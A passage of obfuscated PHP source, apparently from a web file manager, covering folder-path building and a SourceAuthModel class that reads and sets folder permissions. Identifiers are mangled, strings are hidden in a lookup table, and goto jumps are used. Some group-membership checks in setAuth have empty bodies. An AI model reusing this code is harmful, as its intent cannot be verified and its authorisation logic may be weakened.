KodUser::isRoot(); foreach ($ïçõàõÈ as $˜¶§•¼¸ => &$ò” ¬™Ú) { $ò” ¬™Ú[$™ûÉç‡¼[487]] = $³“Ÿ°öŠ[$ò” ¬™Ú[$™ûÉç‡¼[193]]]; if (!$ò” ¬™Ú[$™ûÉç‡¼[487]] && $ò” ¬™Ú[$™ûÉç‡¼[190]] == self::TYPE_GROUP) { $ò” ¬™Ú[$™ûÉç‡¼[487]] = Action($™ûÉç‡¼[568])->pathGroupAuthMake($ò” ¬™Ú[$™ûÉç‡¼[569]]); if (!$ò” ¬™Ú[$™ûÉç‡¼[487]] && !$Åá‹¤‘) { $ò” ¬™Ú[$™ûÉç‡¼[233]] = !1; $ò” ¬™Ú[$™ûÉç‡¼[232]] = !1; } } if ($ò” ¬™Ú[$™ûÉç‡¼[487]]) { $ò” ¬™Ú[$™ûÉç‡¼[233]] = AuthModel::authCheckEdit($ò” ¬™Ú[$™ûÉç‡¼[487]][$™ûÉç‡¼[488]]); $ò” ¬™Ú[$™ûÉç‡¼[232]] = AuthModel::authCheckView($ò” ¬™Ú[$™ûÉç‡¼[487]][$™ûÉç‡¼[488]]); } $this->groupPathDisplay($ò” ¬™Ú); } unset($ò” ¬™Ú); } public function _listAppendAuthSecret(&$Ò­Œ’ªú) { $˜™é·‰ =& $_SERVER[¿ğÚ‰±–]; if (Model($˜™é·‰[508])->get($˜™é·‰[570]) != $˜™é·‰[91]) { return; } static $Ô£ÍïèĞ = false; if (!$Ô£ÍïèĞ) { $ÑÉÑæüÌ = Model($˜™é·‰[571]); $šÚà©Å = Model($˜™é·‰[572]); $Ô£ÍïèĞ = $šÚà©Å->listData(); $Ô£ÍïèĞ = array_to_keyvalue($Ô£ÍïèĞ, $˜™é·‰[193]); $Š²É ’ı = json_decode(Model($˜™é·‰[508])->get($˜™é·‰[573]), !0); $Š²É ’ı = array_to_keyvalue($Š²É ’ı, $˜™é·‰[475]); foreach ($Ô£ÍïèĞ as $µÏ×›Æ => $³æßœ³†) { $«•ñŞ = $Š²É ’ı[$³æßœ³†[$˜™é·‰[574]]]; if (!$«•ñŞ) { $šÚà©Å->remove($³æßœ³†[$˜™é·‰[475]]); unset($Ô£ÍïèĞ[$µÏ×›Æ]); continue; } $ªœäúİ“ = $ÑÉÑæüÌ->listData($«•ñŞ[$˜™é·‰[487]]); if (!$ªœäúİ“) { $šÚà©Å->remove($³æßœ³†[$˜™é·‰[475]]); unset($Ô£ÍïèĞ[$µÏ×›Æ]); continue; } $³æßœ³†[$˜™é·‰[487]] = $ªœäúİ“; $³æßœ³†[$˜™é·‰[575]] = $«•ñŞ; $³æßœ³†[$˜™é·‰[576]] = Model($˜™é·‰[577])->getInfoSimpleOuter($³æßœ³†[$˜™é·‰[527]]); $Ô£ÍïèĞ[$µÏ×›Æ] = $³æßœ³†; } } $£š½­É = USER_ID; $†ĞÖÕ¢Ù = array(); $Ê¦ã¦Í = $this->_listAppendPath($†ĞÖÕ¢Ù, !0); foreach ($Ò­Œ’ªú as $µÏ×›Æ => &$³æßœ³†) { if (!is_array($³æßœ³†[$˜™é·‰[487]])) { continue; } if ($³æßœ³†[$˜™é·‰[190]] != $˜™é·‰[578]) { continue; } if (isset($Ô£ÍïèĞ[$³æßœ³†[$˜™é·‰[193]]])) { $â“Èç³” = $Ô£ÍïèĞ[$³æßœ³†[$˜™é·‰[193]]]; if (!is_array($³æßœ³†[$˜™é·‰[539]])) { $³æßœ³†[$˜™é·‰[539]] = array(); } $³æßœ³†[$˜™é·‰[539]][$˜™é·‰[579]] = $â“Èç³”[$˜™é·‰[574]]; $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[580]] = $â“Èç³”; $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[581]] = $³æßœ³†[$˜™é·‰[582]]; $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[583]] = $˜™é·‰[91]; if ($â“Èç³”[$˜™é·‰[527]] != $£š½­É) { $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[488]] = $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[488]] & $â“Èç³”[$˜™é·‰[487]][$˜™é·‰[487]]; } continue; } $·¹°ÍÒ = $this->parentLevelArray($³æßœ³†[$˜™é·‰[584]]); $õ­ÛúÁ÷ = array_reverse($·¹°ÍÒ); foreach ($õ­ÛúÁ÷ as $ÂÕ–êØº => $¾í›ƒü) { if (!isset($Ô£ÍïèĞ[$¾í›ƒü])) { continue; } $â“Èç³” = $Ô£ÍïèĞ[$¾í›ƒü]; $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[580]] = $â“Èç³”; if ($â“Èç³”[$˜™é·‰[527]] != $£š½­É) { $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[488]] = $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[488]] & $â“Èç³”[$˜™é·‰[487]][$˜™é·‰[487]]; } $èê‡° À = $˜™é·‰[12]; $“ŞØ¼°Â = count($·¹°ÍÒ) - $ÂÕ–êØº; for ($¹·ªÍÏ» = 0; $¹·ªÍÏ» < $“ŞØ¼°Â; $¹·ªÍÏ»++) { if (!isset($Ê¦ã¦Í[$·¹°ÍÒ[$¹·ªÍÏ»]])) { $èê‡° À = $˜™é·‰[12]; break; } $èê‡° À = $èê‡° À . rtrim($Ê¦ã¦Í[$·¹°ÍÒ[$¹·ªÍÏ»]], $˜™é·‰[8]) . $˜™é·‰[8]; } $³æßœ³†[$˜™é·‰[487]][$˜™é·‰[581]] = rtrim($èê‡° À, $˜™é·‰[8]) . $˜™é·‰[8]; break; } } unset($³æßœ³†); } public function groupPathDisplay(&$Î²‡ï„À) { $ä…™¬³½ =& $_SERVER[¿ğÚ‰±–]; if ($Î²‡ï„À[$ä…™¬³½[190]] != self::TYPE_GROUP) { return; } $¶†•‰ = Model($ä…™¬³½[585])->getInfo($Î²‡ï„À[$ä…™¬³½[569]]); $ââ—û÷¿ = $this->parentLevelArray($¶†•‰[$ä…™¬³½[584]]); $Ê÷ƒÍ¡á = $ä…™¬³½[12]; foreach ($ââ—û÷¿ as $şª‚Ùƒˆ) { $¥œƒÚêé = Model($ä…™¬³½[585])->getInfo($şª‚Ùƒˆ); $Ê÷ƒÍ¡á .= $¥œƒÚêé[$ä…™¬³½[90]][$ä…™¬³½[193]] . $ä…™¬³½[50]; } $Î²‡ï„À[$ä…™¬³½[586]] = $¶†•‰[$ä…™¬³½[192]]; $Î²‡ï„À[$ä…™¬³½[587]] = $¶†•‰[$ä…™¬³½[584]]; $Î²‡ï„À[$ä…™¬³½[588]] = $¶†•‰[$ä…™¬³½[589]]; $Î²‡ï„À[$ä…™¬³½[590]] = $Ê÷ƒÍ¡á . $¶†•‰[$ä…™¬³½[90]][$ä…™¬³½[193]]; } protected function _listAppendPath(&$¶øÑ½ÔÙ, $±óöåóå = false) { $ÕôÒà÷ë =& $_SERVER[¿ğÚ‰±–]; static $¬õÅœ¡Ç = array(); $ñ½‰ÍªÕ = array(); $¿ÃŒœ’Ü = array(); if ($±óöåóå) { return $¬õÅœ¡Ç; } foreach ($¶øÑ½ÔÙ as &$²Ûñ«Ş­) { $ØíÓ‘Óò = $²Ûñ«Ş­[$ÕôÒà÷ë[193]]; if ($²Ûñ«Ş­[$ÕôÒà÷ë[485]] == $ÕôÒà÷ë[91] && $²Ûñ«Ş­[$ÕôÒà÷ë[192]] != 0) { $¬õÅœ¡Ç[$ØíÓ‘Óò] = $²Ûñ«Ş­[$ÕôÒà÷ë[32]]; } if ($²Ûñ«Ş­[$ÕôÒà÷ë[485]] == $ÕôÒà÷ë[91] && $²Ûñ«Ş­[$ÕôÒà÷ë[192]] == 0) { $¬õÅœ¡Ç[$ØíÓ‘Óò] = $this->_listAppendPathRoot($²Ûñ«Ş­, array()); } if (isset($¿ÃŒœ’Ü[$²Ûñ«Ş­[$ÕôÒà÷ë[584]]])) { continue; } $¿ÃŒœ’Ü[$²Ûñ«Ş­[$ÕôÒà÷ë[584]]] = !0; $ĞĞæŸ = $this->parentLevelArray($²Ûñ«Ş­[$ÕôÒà÷ë[584]]); foreach ($ĞĞæŸ as $éò‹÷ˆ => $ƒüû) { if (isset($¬õÅœ¡Ç[$ƒüû])) { continue; } if ($éò‹÷ˆ == 0) { $¬õÅœ¡Ç[$ƒüû] = $this->_listAppendPathRoot($²Ûñ«Ş­, $ĞĞæŸ); } if ($éò‹÷ˆ != 0) { $ñ½‰ÍªÕ[] = $ƒüû; } } } unset($²Ûñ«Ş­); $ñ½‰ÍªÕ = array_unique($ñ½‰ÍªÕ); if (count($ñ½‰ÍªÕ) > 0) { $ÀÂ®´Ş² = array($ÕôÒà÷ë[491] => array($ÕôÒà÷ë[492], $ñ½‰ÍªÕ)); if (count($ñ½‰ÍªÕ) == 1) { $§µ©­îË = $this->sourceInfo($ñ½‰ÍªÕ[0]); $İú”¼£  = is_array($§µ©­îË) ? array($§µ©­îË) : !1; } else { $İú”¼£  = $this->field($ÕôÒà÷ë[591])->where($ÀÂ®´Ş²)->select(); } if (!$İú”¼£ ) { $İú”¼£  = array(); } foreach ($İú”¼£  as $È×›— ›) { $¬õÅœ¡Ç[$È×›— ›[$ÕôÒà÷ë[193]]] = $È×›— ›[$ÕôÒà÷ë[32]]; } } $¨¨ª¡Šò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $âÁ£Æ¼ = array(); foreach ($¶øÑ½ÔÙ as &$²Ûñ«Ş­) { $ê¹˜’Œ = $²Ûñ«Ş­[$ÕôÒà÷ë[584]]; $‡½–‹Ù¤ = $ÕôÒà÷ë[12]; if (isset($âÁ£Æ¼[$ê¹˜’Œ])) { $‡½–‹Ù¤ = $âÁ£Æ¼[$ê¹˜’Œ]; } else { $ĞĞæŸ = $this->parentLevelArray($²Ûñ«Ş­[$ÕôÒà÷ë[584]]); foreach ($ĞĞæŸ as $éò‹÷ˆ => $ƒüû) { if (isset($¬õÅœ¡Ç[$ƒüû])) { $‡½–‹Ù¤ .= $¬õÅœ¡Ç[$ƒüû] . $ÕôÒà÷ë[8]; } } $âÁ£Æ¼[$ê¹˜’Œ] = $‡½–‹Ù¤; } $‡½–‹Ù¤ .= $²Ûñ«Ş­[$ÕôÒà÷ë[32]]; if ($²Ûñ«Ş­[$ÕôÒà÷ë[485]] == $ÕôÒà÷ë[91]) { $‡½–‹Ù¤ .= $ÕôÒà÷ë[8]; } $²Ûñ«Ş­[$ÕôÒà÷ë[582]] = str_replace($ÕôÒà÷ë[592], $ÕôÒà÷ë[8], $‡½–‹Ù¤); if ($²Ûñ«Ş­[$ÕôÒà÷ë[192]] == $ÕôÒà÷ë[228]) { $²Ûñ«Ş­[$ÕôÒà÷ë[32]] = trim($¬õÅœ¡Ç[$²Ûñ«Ş­[$ÕôÒà÷ë[193]]], $ÕôÒà÷ë[8]); $²Ûñ«Ş­[$ÕôÒà÷ë[582]] = $²Ûñ«Ş­[$ÕôÒà÷ë[32]] . $ÕôÒà÷ë[8]; } if (intval($²Ûñ«Ş­[$ÕôÒà÷ë[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($²Ûñ«Ş­, $ĞĞæŸ, $¨¨ª¡Šò); } } unset($²Ûñ«Ş­); return $¶øÑ½ÔÙ; } private function _listAppendPathRecycle(&$Ê¦Àô§Ÿ, $™ß¥ÚµÁ, $…Ì¾¡¶í) { $™£µ©Â =& $_SERVER[¿ğÚ‰±–]; if (!in_array($…Ì¾¡¶í, $™ß¥ÚµÁ) && $Ê¦Àô§Ÿ[$™£µ©Â[193]] != $…Ì¾¡¶í) { return; } $ñ™¦šª® = explode($™£µ©Â[8], trim($Ê¦Àô§Ÿ[$™£µ©Â[582]], $™£µ©Â[8])); $‹‹ø¹ïº = implode($™£µ©Â[8], array_slice($ñ™¦šª®, 2)); $Ê¦Àô§Ÿ[$™£µ©Â[582]] = $™£µ©Â[8] . LNG($™£µ©Â[593]) . $™£µ©Â[8] . ltrim($‹‹ø¹ïº, $™£µ©Â[8]); $Ê¦Àô§Ÿ[$™£µ©Â[584]] = $™£µ©Â[594] . implode($™£µ©Â[50], array_slice($™ß¥ÚµÁ, 1)) . $™£µ©Â[50]; if ($Ê¦Àô§Ÿ[$™£µ©Â[193]] == $…Ì¾¡¶í) { $Ê¦Àô§Ÿ[$™£µ©Â[584]] = $™£µ©Â[594]; $Ê¦Àô§Ÿ[$™£µ©Â[192]] = $™£µ©Â[228]; $Ê¦Àô§Ÿ[$™£µ©Â[32]] = LNG($™£µ©Â[593]); } $Ê¦Àô§Ÿ[$™£µ©Â[595]] = $™£µ©Â[596]; } protected function _listAppendPathRoot(&$Ç¿ô¸, $ƒ÷¬¸ˆì) { $›ıÅÍŸÌ =& $_SERVER[¿ğÚ‰±–]; static $™–ÅÇÊ˜ = false; $ö£¦Ì‹… = $›ıÅÍŸÌ[12]; if ($Ç¿ô¸[$›ıÅÍŸÌ[190]] == self::TYPE_USER) { if ($Ç¿ô¸[$›ıÅÍŸÌ[569]] == USER_ID) { $ö£¦Ì‹… = LNG($›ıÅÍŸÌ[597]); if ($™–ÅÇÊ˜ === !1) { $·¼¸˜ˆ = Model($›ıÅÍŸÌ[598])->getInfoFull(USER_ID); $™–ÅÇÊ˜ = _get($·¼¸˜ˆ, $›ıÅÍŸÌ[599], $›ıÅÍŸÌ[12]); } if ($ƒ÷¬¸ˆì && $ƒ÷¬¸ˆì[0] == $™–ÅÇÊ˜ || !$ƒ÷¬¸ˆì && $Ç¿ô¸[$›ıÅÍŸÌ[193]] == $™–ÅÇÊ˜) { $ö£¦Ì‹… = LNG($›ıÅÍŸÌ[600]); $Ç¿ô¸[$›ıÅÍŸÌ[601]] = $›ıÅÍŸÌ[602]; } if (!$ƒ÷¬¸ˆì) { $Ç¿ô¸[$›ıÅÍŸÌ[32]] = $ö£¦Ì‹…; } } else { $Ç¿ô¸[$›ıÅÍŸÌ[603]] = Model($›ıÅÍŸÌ[577])->getInfoSimpleOuter($Ç¿ô¸[$›ıÅÍŸÌ[569]]); $ö£¦Ì‹… = LNG($›ıÅÍŸÌ[604]) . $›ıÅÍŸÌ[176] . $Ç¿ô¸[$›ıÅÍŸÌ[603]][$›ıÅÍŸÌ[32]] . $›ıÅÍŸÌ[178]; } } else { if ($Ç¿ô¸[$›ıÅÍŸÌ[190]] == self::TYPE_GROUP) { $ô¼öçà = Model($›ıÅÍŸÌ[585])->getInfoSimple($Ç¿ô¸[$›ıÅÍŸÌ[569]]); $ö£¦Ì‹… = $ô¼öçà[$›ıÅÍŸÌ[32]]; } else { if ($Ç¿ô¸[$›ıÅÍŸÌ[190]] == self::TYPE_SYSTEM) { $ö£¦Ì‹… = $›ıÅÍŸÌ[605]; } } } $ö£¦Ì‹… = $ö£¦Ì‹… ? $›ıÅÍŸÌ[8] . $ö£¦Ì‹… . $›ıÅÍŸÌ[8] : $›ıÅÍŸÌ[8]; return $ö£¦Ì‹…; } protected function _listAppendUser(&$Í®°ì£) { $‡ä¼ñÄÎ =& $_SERVER[¿ğÚ‰±–]; $Ô˜Ãö = array_to_keyvalue($Í®°ì£, $‡ä¼ñÄÎ[12], $‡ä¼ñÄÎ[527]); $Ø®‚è‡Ÿ = array_to_keyvalue($Í®°ì£, $‡ä¼ñÄÎ[12], $‡ä¼ñÄÎ[529]); $Ş¢†¯ş„ = array_merge($Ô˜Ãö, $Ø®‚è‡Ÿ); $†Æ±áÒ = Model($‡ä¼ñÄÎ[598])->userListInfo($Ş¢†¯ş„); foreach ($Í®°ì£ as &$ìˆ‘Ìı½) { $œŒùë›’ = $ìˆ‘Ìı½[$‡ä¼ñÄÎ[527]]; $ìˆ‘Ìı½[$‡ä¼ñÄÎ[527]] = $†Æ±áÒ[$œŒùë›’] ? $†Æ±áÒ[$œŒùë›’] : !1; $œŒùë›’ = $ìˆ‘Ìı½[$‡ä¼ñÄÎ[529]]; $ìˆ‘Ìı½[$‡ä¼ñÄÎ[529]] = $†Æ±áÒ[$œŒùë›’] ? $†Æ±áÒ[$œŒùë›’] : !1; if (_get($ìˆ‘Ìı½, $‡ä¼ñÄÎ[606], 0)) { $ÁŠ½é·˜ = $GLOBALS[$‡ä¼ñÄÎ[6]][$‡ä¼ñÄÎ[92]][$‡ä¼ñÄÎ[607]]; if ($ìˆ‘Ìı½[$‡ä¼ñÄÎ[539]][$‡ä¼ñÄÎ[608]] <= time() - $ÁŠ½é·˜) { $this->metaSet($ìˆ‘Ìı½[$‡ä¼ñÄÎ[193]], $‡ä¼ñÄÎ[609], null); $this->metaSet($ìˆ‘Ìı½[$‡ä¼ñÄÎ[193]], $‡ä¼ñÄÎ[608], null); unset($ìˆ‘Ìı½[$‡ä¼ñÄÎ[539]][$‡ä¼ñÄÎ[609]]); continue; } $¥Ñş´³ˆ = $ìˆ‘Ìı½[$‡ä¼ñÄÎ[539]][$‡ä¼ñÄÎ[609]]; $ìˆ‘Ìı½[$‡ä¼ñÄÎ[539]][$‡ä¼ñÄÎ[610]] = Model($‡ä¼ñÄÎ[598])->getInfoSimpleOuter($¥Ñş´³ˆ); } } unset($ìˆ‘Ìı½); } public function parentLevelArray($°¿ëşŸá) { $×¬¢‰” =& $_SERVER[¿ğÚ‰±–]; $°¿ëşŸá = explode($×¬¢‰”[50], trim($°¿ëşŸá, $×¬¢‰”[50])); return array_remove_value($°¿ëşŸá, $×¬¢‰”[228]); } public function listAll($ªÜ†‹š¬) { $ƒƒÎºÜô =& $_SERVER[¿ğÚ‰±–]; $½¨¸ôÃª = $this->sourceInfo($ªÜ†‹š¬); $ƒ¸ÑÌÒ = array($ƒƒÎºÜô[611] => array($ƒƒÎºÜô[612], $½¨¸ôÃª[$ƒƒÎºÜô[584]] . $ªÜ†‹š¬ . $ƒƒÎºÜô[613]), $ƒƒÎºÜô[614] => 0); $­ğÛ¾¶á = $ƒƒÎºÜô[615]; $ÒÊéïƒ = "\x4c\105\x46\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\151\x6f\x5f\146\151\154\x65\x20\146\x69\x6c\145\x20\157\x6e\x20\x73\x6f\x75\162\143\x65\x2e\x66\151\154\145\x49\x44\x20\75\40\x66\x69\x6c\145\x2e\146\x69\154\145\x49\x44"; $„“„ĞŠ¦ = $this->alias($ƒƒÎºÜô[519])->field($­ğÛ¾¶á)->where($ƒ¸ÑÌÒ)->join($ÒÊéïƒ)->select(); $this->_listAppendAuth($„“„ĞŠ¦); $this->_listAppendUser($„“„ĞŠ¦); $this->_listAppendPath($„“„ĞŠ¦); $„“„ĞŠ¦ = array_to_keyvalue($„“„ĞŠ¦, $ƒƒÎºÜô[193]); $™·°ê³ş = "\57{$½¨¸ôÃª[$ƒƒÎºÜô[32]]}\57"; $™·°ê³ş = $™·°ê³ş == $ƒƒÎºÜô[592] ? $ƒƒÎºÜô[8] : $™·°ê³ş; $ş¸ÖŠØŸ = array(); foreach ($„“„ĞŠ¦ as $‚©³ÈŒ· => $˜™ÄèŸÈ) { $é¦‘•Ì = $this->parentLevelArray($˜™ÄèŸÈ[$ƒƒÎºÜô[584]]); array_shift($é¦‘•Ì); $ô¦ÉŠ¸ = $™·°ê³ş; for ($íÅŒÈ³î = 0; $íÅŒÈ³î < count($é¦‘•Ì); $íÅŒÈ³î++) { $ô¦ÉŠ¸ .= $„“„ĞŠ¦[$é¦‘•Ì[$íÅŒÈ³î]][$ƒƒÎºÜô[32]] . $ƒƒÎºÜô[8]; } $ô¦ÉŠ¸ .= $˜™ÄèŸÈ[$ƒƒÎºÜô[32]]; if ($˜™ÄèŸÈ[$ƒƒÎºÜô[485]]) { $ô¦ÉŠ¸ .= $ƒƒÎºÜô[8]; } $¢í’¦²€ = array($ƒƒÎºÜô[495] => str_replace($ƒƒÎºÜô[592], $ƒƒÎºÜô[8], str_replace($ƒƒÎºÜô[592], $ƒƒÎºÜô[8], str_replace($ƒƒÎºÜô[592], $ƒƒÎºÜô[8], $ô¦ÉŠ¸))), $ƒƒÎºÜô[616] => intval($˜™ÄèŸÈ[$ƒƒÎºÜô[485]]), $ƒƒÎºÜô[617] => intval($˜™ÄèŸÈ[$ƒƒÎºÜô[79]]), $ƒƒÎºÜô[88] => intval($˜™ÄèŸÈ[$ƒƒÎºÜô[88]]), $ƒƒÎºÜô[90] => $this->pathInfoFilter($˜™ÄèŸÈ)); if (!$¢í’¦²€[$ƒƒÎºÜô[485]]) { $¢í’¦²€[$ƒƒÎºÜô[541]] = $˜™ÄèŸÈ[$ƒƒÎºÜô[541]]; } $ş¸ÖŠØŸ[] = $¢í’¦²€; } $ş¸ÖŠØŸ = array_sort_by($ş¸ÖŠØŸ, $ƒƒÎºÜô[87]); return $ş¸ÖŠØŸ; } } goto aïä‡ƒ‰¿; Bå£Õöˆ²õ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\145\x5f\141\x75\x74\x68"; public function getAuth($°­×ğæ) { $Ë»öèí‹ =& $_SERVER[¿ğÚ‰±–]; $ú™Ÿœµ× = $this->sourceAuthSelect($°­×ğæ); $®¿È—´† = array(); $¢Ç¥şÁé = array(); $ÉÜŠÛÙ = 2 << 25; foreach ($ú™Ÿœµ× as $÷—¨ê·“) { $¼…¬¨æ = Model($Ë»öèí‹[571])->listData($÷—¨ê·“[$Ë»öèí‹[2084]]); if (!$¼…¬¨æ) { continue; } $®¿È—´†[] = $÷—¨ê·“; $‘Ùæ«şÏ = 0; if ($÷—¨ê·“[$Ë»öèí‹[190]] == SourceModel::TYPE_GROUP) { $‘Ùæ«şÏ = $ÉÜŠÛÙ * 2; } if ($÷—¨ê·“[$Ë»öèí‹[190]] == SourceModel::TYPE_USER) { $‘Ùæ«şÏ = $ÉÜŠÛÙ; } if ($÷—¨ê·“[$Ë»öèí‹[190]] == SourceModel::TYPE_USER && $÷—¨ê·“[$Ë»öèí‹[569]] == $Ë»öèí‹[228]) { $‘Ùæ«şÏ = 0; } $¢Ç¥şÁé[] = $¼…¬¨æ[$Ë»öèí‹[487]] + $‘Ùæ«şÏ; } array_multisort($¢Ç¥şÁé, SORT_DESC, $®¿È—´†); return $®¿È—´†; } public function sourceAuthSelect($§û±¯¢¬) { $¢ÉÅ™¤Ë =& $_SERVER[¿ğÚ‰±–]; static $œİ·ñÍ‹ = array(); $ÇöÄŸêÛ = is_array($§û±¯¢¬) ? !1 : !0; if ($ÇöÄŸêÛ) { $§û±¯¢¬ = array($§û±¯¢¬); } $¤æĞğÀ = array(); foreach ($§û±¯¢¬ as $¬÷óŒÆ) { if (isset($œİ·ñÍ‹[$¬÷óŒÆ])) { $¤æĞğÀ[$¬÷óŒÆ] = $œİ·ñÍ‹[$¬÷óŒÆ]; } } if (count($¤æĞğÀ) == count($§û±¯¢¬)) { return $ÇöÄŸêÛ ? $¤æĞğÀ[$§û±¯¢¬[0]] : $¤æĞğÀ; } $©‡èÀá = $¢ÉÅ™¤Ë[2161]; $´ïÅ™Â° = array($¢ÉÅ™¤Ë[193] => array($¢ÉÅ™¤Ë[7], $§û±¯¢¬)); $ÎÜğ‰è¼ = $this->field($©‡èÀá)->order($¢ÉÅ™¤Ë[475])->where($´ïÅ™Â°)->select(); $€±ôÓøÔ = array_to_keyvalue_group($ÎÜğ‰è¼, $¢ÉÅ™¤Ë[193]); foreach ($§û±¯¢¬ as $¬÷óŒÆ) { $œİ·ñÍ‹[$¬÷óŒÆ] = $€±ôÓøÔ[$¬÷óŒÆ] ? $€±ôÓøÔ[$¬÷óŒÆ] : array(); } if ($ÇöÄŸêÛ) { return $ÎÜğ‰è¼; } return $€±ôÓøÔ; } public function setAuth($µ…ÛÏÖŒ, $õ°¬²®Ä) { $¬‚„¬º =& $_SERVER[¿ğÚ‰±–]; $¤æ¯‘–· = Model($¬‚„¬º[1425])->sourceInfo($µ…ÛÏÖŒ); if (!$¤æ¯‘–·) { return !1; } if ($¤æ¯‘–·[$¬‚„¬º[190]] != SourceModel::TYPE_GROUP) { return !1; } $÷ùá¿¡ = 1; $Å“ÎÌ‰ = $¤æ¯‘–·[$¬‚„¬º[569]]; if ($Å“ÎÌ‰ != $÷ùá¿¡) { $Ñªêˆ„ = array($¬‚„¬º[1976] => $Å“ÎÌ‰); $Ô¶á¨ş½ = Model($¬‚„¬º[2070])->field($¬‚„¬º[1777])->where($Ñªêˆ„)->select(); $Ô¶á¨ş½ = array_to_keyvalue($Ô¶á¨ş½, $¬‚„¬º[12], $¬‚„¬º[1777]); } $¥é«½‰¾ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $”í‡Ëûµ = array(); foreach ($õ°¬²®Ä as $æ•¹ã¤º) { if (!in_array($æ•¹ã¤º[$¬‚„¬º[190]], $¥é«½‰¾)) { show_json(LNG($¬‚„¬º[2162]), !1); } if ($Å“ÎÌ‰ != $÷ùá¿¡) { if ($æ•¹ã¤º[$¬‚„¬º[190]] == SourceModel::TYPE_GROUP) { } if ($æ•¹ã¤º[$¬‚„¬º[569]] != 0 && !in_array($æ•¹ã¤º[$¬‚„¬º[569]], $Ô¶á¨ş½)) { } } if ($æ•¹ã¤º[$¬‚„¬º[569]] == 0) { $æ•¹ã¤º[$¬‚„¬º[190]] = SourceModel::TYPE_USER; } $”í‡Ëûµ[] = array($¬‚„¬º[193] => $µ…ÛÏÖŒ, $¬‚„¬º[190] => intval($æ•¹ã¤º[$¬‚„¬º[190]]), $¬‚„¬º[569] => intval($æ•¹ã¤º[$¬‚„¬º[569]]), $¬‚„¬º[2084] => intval($æ•¹ã¤º[$¬‚„¬º[2084]]) ? intval($æ•¹ã¤º[$¬‚„¬º[2084]]) : 0, $¬‚„¬º[2144] => intval($æ•¹ã¤º[$¬‚„¬º[2144]]) ? intval($æ•¹ã¤º[$¬‚„¬º[2144]]) : -1); } $this->where(array($¬‚„¬º[491] => $µ…ÛÏÖŒ))->delete(); $this->addAll($”í‡Ëûµ); return !0; } public function authClear($Ë¦Ğã•Ù) { $î‡êåğı =& $_SERVER[¿ğÚ‰±–]; $ÚÂ¬ôÍ = Model($î‡êåğı[1425])->sourceInfo($Ë¦Ğã•Ù); $ûŸ¹§‘‹ = array($Ë¦Ğã•Ù); if ($ÚÂ¬ôÍ[$î‡êåğı[485]] == $î‡êåğı[91]) { $ñúšà›¶ = array($î‡êåğı[652] => array($î‡êåğı[612], $ÚÂ¬ôÍ[$î‡êåğı[584]] . $Ë¦Ğã•Ù . $î‡êåğı[613])); $ûŸ¹§‘‹ = Model($î‡êåğı[1425])->field($î‡êåğı[491])->where($ñúšà›¶)->getField($î‡êåğı[193], !0); $ûŸ¹§‘‹[] = $Ë¦Ğã•Ù; } $this->where(array($î‡êåğı[491] => array($î‡êåğı[492], $ûŸ¹§‘‹)))->delete(); return !0; } public function getAllChildren($ÌŠûÎ) { $×ˆÔ®àï =& $_SERVER[¿ğÚ‰±–]; $ Şı—µå = Model($×ˆÔ®àï[1425])->sourceInfo($ÌŠûÎ); if ($ Şı—µå[$×ˆÔ®àï[485]] != $×ˆÔ®àï[91]) { return $this->sourceListAuth(array($ÌŠûÎ)); } if ($ Şı—µå[$×ˆÔ®àï[190]] != SourceModel::TYPE_GROUP) { return array(); } $ÑÂ¨®ªÖ = 1; $˜—¿ã‹  = array($ÌŠûÎ); if ($ Şı—µå[$×ˆÔ®àï[192]] == $×ˆÔ®àï[228] && $ Şı—µå[$×ˆÔ®àï[569]] != $ÑÂ¨®ªÖ) { $˜—¿ã‹  = $this->groupChidldAllRootSource($ Şı—µå[$×ˆÔ®àï[569]]); } $—¤ê‡¹ì = $this->field($×ˆÔ®àï[193])->group($×ˆÔ®àï[193])->select(); $—¤ê‡¹ì = array_to_keyvalue($—¤ê‡¹ì, $×ˆÔ®àï[12], $×ˆÔ®àï[193]); if (!$—¤ê‡¹ì) { return array(); } $ÚôÖ³¾÷ = $×ˆÔ®àï[2163]; $‘öŸ¹·î = array($×ˆÔ®àï[193] => array($×ˆÔ®àï[7], $—¤ê‡¹ì), $×ˆÔ®àï[505] => $×ˆÔ®àï[228]); $³İ´éàÇ = Model($×ˆÔ®àï[902])->field($ÚôÖ³¾÷)->where($‘öŸ¹·î)->select(); $¡„ «á¬ = array($ÌŠûÎ); foreach ($³İ´éàÇ as $¡ĞƒşæØ) { foreach ($˜—¿ã‹  as $¦Ö¦µÀ¦) { $¯—¤‘ˆ = $×ˆÔ®àï[50] . $¦Ö¦µÀ¦ . $×ˆÔ®àï[50]; $÷ÇÒ™¨ß = $¡ĞƒşæØ[$×ˆÔ®àï[584]] . $¡ĞƒşæØ[$×ˆÔ®àï[193]] . $×ˆÔ®àï[50]; if (strstr($÷ÇÒ™¨ß, $¯—¤‘ˆ)) { $¡„ «á¬[] = $¡ĞƒşæØ[$×ˆÔ®àï[193]]; break; } } } return $this->sourceListAuth($¡„ «á¬); } private function sourceListAuth($…Îˆ‡«‘) { $¦ˆµ¬í =& $_SERVER[¿ğÚ‰±–]; $ˆ×âíÁ² = Model($¦ˆµ¬í[1425])->sourceListInfo($…Îˆ‡«‘, !0); $Ã±ó©Æ¾ = $this->sourceAuthSelect($…Îˆ‡«‘); $¶°‚‰ç‹ = array(); $²ˆÏªØÎ = array(); foreach ($ˆ×âíÁ² as $¾ÚÄÙ›á) { unset($¾ÚÄÙ›á[$¦ˆµ¬í[529]]); unset($¾ÚÄÙ›á[$¦ˆµ¬í[527]]); unset($¾ÚÄÙ›á[$¦ˆµ¬í[487]]); unset($¾ÚÄÙ›á[$¦ˆµ¬í[90]]); $¼¶“´²Á = $Ã±ó©Æ¾[$¾ÚÄÙ›á[$¦ˆµ¬í[193]]]; if (!$¼¶“´²Á) { continue; } $¾ÚÄÙ›á[$¦ˆµ¬í[2164]] = $this->authTargetInfo($¼¶“´²Á); 